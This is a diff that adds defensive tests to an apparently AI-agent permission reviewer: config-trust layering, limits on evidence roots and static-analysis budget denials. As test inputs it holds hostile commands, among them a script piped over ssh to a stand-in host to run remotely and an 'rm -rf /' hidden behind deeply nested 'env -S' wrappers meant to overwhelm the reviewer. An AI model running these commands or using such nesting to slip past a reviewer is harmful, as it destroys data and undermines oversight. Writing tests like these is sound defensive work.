@@ -169,6 +169,139 @@ describe("trust hardening — project config cannot weaken trusted layers", () =
     }
   })
 
+  test("project cannot choose the reviewer variant, output format, or retention", () => {
+    const globalDir = tempDir("reviewer-global-")
+    const projectDir = tempDir("reviewer-project-")
+    try {
+      // Isolate the global layer: a missing file in a temp directory, never
+      // the developer's real global config.
+      setGlobalConfigPathForTests(join(globalDir, "permission-reviewer.jsonc"))
+      mkdirSync(join(projectDir, ".opencode"), { recursive: true })
+      writeFileSync(
+        projectConfigPath(projectDir),
+        JSON.stringify({
+          variant: "minimal",
+          outputFormat: "text",
+          retainReviewSessions: false,
+          askDecisions: false,
+        }),
+      )
+      const loaded = loadResolvedConfig(
+        { variant: "high", outputFormat: "json_schema", retainReviewSessions: true },
+        projectDir,
+      )
+      expect(loaded.variant).toBe("high")
+      expect(loaded.outputFormat).toBe("json_schema")
+      expect(loaded.retainReviewSessions).toBe(true)
+      expect(loaded.askDecisions).toBe(true)
+    } finally {
+      setGlobalConfigPathForTests(undefined)
+      rmSync(globalDir, { recursive: true })
+      rmSync(projectDir, { recursive: true })
+    }
+  })
+
+  test("project cannot flip a trusted askDecisions false back on", () => {
+    const globalDir = tempDir("reviewer-global-")
+    const projectDir = tempDir("reviewer-project-")
+    try {
+      const globalPath = join(globalDir, "permission-reviewer.jsonc")
+      writeFileSync(globalPath, JSON.stringify({ askDecisions: false }))
+      setGlobalConfigPathForTests(globalPath)
+      mkdirSync(join(projectDir, ".opencode"), { recursive: true })
+      for (const value of [true, null, "yes"] as const) {
+        writeFileSync(projectConfigPath(projectDir), JSON.stringify({ askDecisions: value }))
+        const loaded = loadResolvedConfig(undefined, projectDir)
+        expect(loaded.askDecisions).toBe(false)
+      }
+    } finally {
+      setGlobalConfigPathForTests(undefined)
+      rmSync(globalDir, { recursive: true })
+      rmSync(projectDir, { recursive: true })
+    }
+  })
+
+  test("project cannot set reviewer resource knobs in either direction", () => {
+    const globalDir = tempDir("reviewer-global-")
+    const projectDir = tempDir("reviewer-project-")
+    try {
+      // A global baseline distinct from the defaults proves the project
+      // value is dropped, not merely clamped.
+      const globalPath = join(globalDir, "permission-reviewer.jsonc")
+      writeFileSync(
+        globalPath,
+        JSON.stringify({
+          timeoutMs: 20_000,
+          reviewBudgetMs: 15_000,
+          maxContextChars: 64_000,
+          transcriptMessages: 24,
+          historyMessages: 400,
+          maxSessionDepth: 6,
+        }),
+      )
+      setGlobalConfigPathForTests(globalPath)
+      mkdirSync(join(projectDir, ".opencode"), { recursive: true })
+      // Raise, lower, null, and wrong-type attempts must all be ignored.
+      writeFileSync(
+        projectConfigPath(projectDir),
+        JSON.stringify({
+          timeoutMs: 999_999,
+          reviewBudgetMs: 1,
+          maxContextChars: 4_000,
+          maxEnrichmentChars: 500_000,
+          transcriptMessages: 1,
+          historyMessages: null,
+          maxSessionDepth: "many",
+        }),
+      )
+      const loaded = loadResolvedConfig(undefined, projectDir)
+      expect(loaded.timeoutMs).toBe(20_000)
+      expect(loaded.reviewBudgetMs).toBe(15_000)
+      expect(loaded.maxContextChars).toBe(64_000)
+      expect(loaded.maxEnrichmentChars).toBe(DEFAULT_CONFIG.maxEnrichmentChars)
+      expect(loaded.transcriptMessages).toBe(24)
+      expect(loaded.historyMessages).toBe(400)
+      expect(loaded.maxSessionDepth).toBe(6)
+    } finally {
+      setGlobalConfigPathForTests(undefined)
+      rmSync(globalDir, { recursive: true })
+      rmSync(projectDir, { recursive: true })
+    }
+  })
+
+  test("trusted inline still selects reviewer resource knobs", () => {
+    const projectDir = tempDir("reviewer-project-")
+    try {
+      mkdirSync(join(projectDir, ".opencode"), { recursive: true })
+      writeFileSync(projectConfigPath(projectDir), JSON.stringify({ timeoutMs: 555_000 }))
+      const loaded = loadResolvedConfig({ timeoutMs: 12_345, maxContextChars: 90_000 }, projectDir)
+      expect(loaded.timeoutMs).toBe(12_345)
+      expect(loaded.maxContextChars).toBe(90_000)
+    } finally {
+      rmSync(projectDir, { recursive: true })
+    }
+  })
+
+  test("a wrong-type trusted budget falls back to the builtin default", () => {
+    const globalDir = tempDir("reviewer-global-")
+    const projectDir = tempDir("reviewer-project-")
+    try {
+      const globalPath = join(globalDir, "permission-reviewer.jsonc")
+      writeFileSync(globalPath, JSON.stringify({ maxContextChars: "garbage" }))
+      setGlobalConfigPathForTests(globalPath)
+      mkdirSync(join(projectDir, ".opencode"), { recursive: true })
+      writeFileSync(projectConfigPath(projectDir), JSON.stringify({ maxContextChars: 4_000 }))
+      const loaded = loadResolvedConfig(undefined, projectDir)
+      // The unusable trusted value resolves to the builtin default; the
+      // project layer never gets a say either way.
+      expect(loaded.maxContextChars).toBe(32_000)
+    } finally {
+      setGlobalConfigPathForTests(undefined)
+      rmSync(globalDir, { recursive: true })
+      rmSync(projectDir, { recursive: true })
+    }
+  })
+
   test("a malformed global config warns instead of silently behaving like an absent one", () => {
     const warnDir = tempDir("reviewer-global-")
     const projectDir = tempDir("reviewer-project-")
@@ -416,6 +549,23 @@ describe("trust hardening — ssh stdin resolution after cd", () => {
       expect(result.text).toContain("script.sh")
     } finally {
       rmSync(root, { recursive: true })
+    }
+  })
+
+  test("cd to a directory outside the approved roots never mints a read root", async () => {
+    const root = tempDir("reviewer-ssh-")
+    const outside = tempDir("reviewer-outside-")
+    try {
+      writeFileSync(join(outside, "secret.sh"), "echo exfiltrated payload\n")
+      const command = `cd ${outside} && cat secret.sh | ssh deploy@prod.invalid 'bash -'`
+      const result = await enrichSshEvidence(bashRequest(command), root, root, 24_000)
+      expect(result.preflightDenial).toBeUndefined()
+      expect(result.text).toContain('"status": "blocked"')
+      expect(result.text).toContain("outside approved enrichment roots")
+      expect(result.text).not.toContain("exfiltrated payload")
+    } finally {
+      rmSync(root, { recursive: true })
+      rmSync(outside, { recursive: true })
     }
   })
 })
@@ -1049,6 +1199,42 @@ describe("trust hardening — elided action evidence blocks automatic approval",
     expect(client.replies).toHaveLength(0)
     expect(client.uiStatuses.map((s) => s.phase)).toEqual(["reviewing", "manual"])
   })
+
+  test("wrapper nesting beyond the lexer budget is denied before any model call", async () => {
+    // The deterministic brake cannot resolve this structure within its
+    // budget, so the request is rejected with the resource-limit reason
+    // before evidence collection or a model call: a fooled model allow never
+    // gets the chance to auto-approve it.
+    const client = new MockClient()
+    const harness = runtime(client)
+    const command = `${"env -S ".repeat(33)}rm -rf /`
+    const result = await harness.runtime.process(
+      request({ metadata: { command }, patterns: [command] }),
+    )
+    expect(result.kind).toBe("deny")
+    expect(result.reason).toContain("exceeded the static analysis budget")
+    expect(result.reason).not.toContain("unmistakable broad system destruction")
+    // No reviewer session is ever created: the limit is resolved before any
+    // model call, and the deny itself is delivered as the single reply.
+    expect(client.creates).toHaveLength(0)
+    expect(client.replies).toHaveLength(1)
+  })
+
+  test("a wide command past the total effective-command budget never reaches the model", async () => {
+    // Thousands of independent segments each fit every per-segment ceiling;
+    // only the shared per-request budget catches the total. The engine must
+    // stop it deterministically without spending a review.
+    const client = new MockClient()
+    const harness = runtime(client)
+    const command = Array.from({ length: 9_000 }, (_, i) => `echo segment-${i}`).join(";")
+    const result = await harness.runtime.process(
+      request({ metadata: { command }, patterns: [command] }),
+    )
+    expect(result.kind).toBe("deny")
+    expect(result.reason).toContain("exceeded the static analysis budget")
+    expect(client.creates).toHaveLength(0)
+    expect(client.replies).toHaveLength(1)
+  })
 })
 
 // --- reviewer isolation -------------------------------------------------------------------
@@ -1154,7 +1340,7 @@ describe("trust hardening — ssh stdin file evidence resilience", () => {
       const fifo = join(directory, "pipe")
       await execFileAsync("mkfifo", [fifo])
       const started = Date.now()
-      const result = await includeEvidenceFile(fifo, directory, directory, 10_000)
+      const result = await includeEvidenceFile(fifo, directory, directory, directory, 10_000)
       expect(Date.now() - started).toBeLessThan(5_000)
       expect(result.status).toBe("unavailable")
       expect(result.reason).toContain("not a regular file")
@@ -1171,6 +1357,7 @@ describe("trust hardening — ssh stdin file evidence resilience", () => {
       await execFileAsync("ln", ["-s", join(directory, "real"), join(directory, "sub")])
       const result = await includeEvidenceFile(
         join(directory, "sub", "script.txt"),
+        directory,
         directory,
         directory,
         10_000,
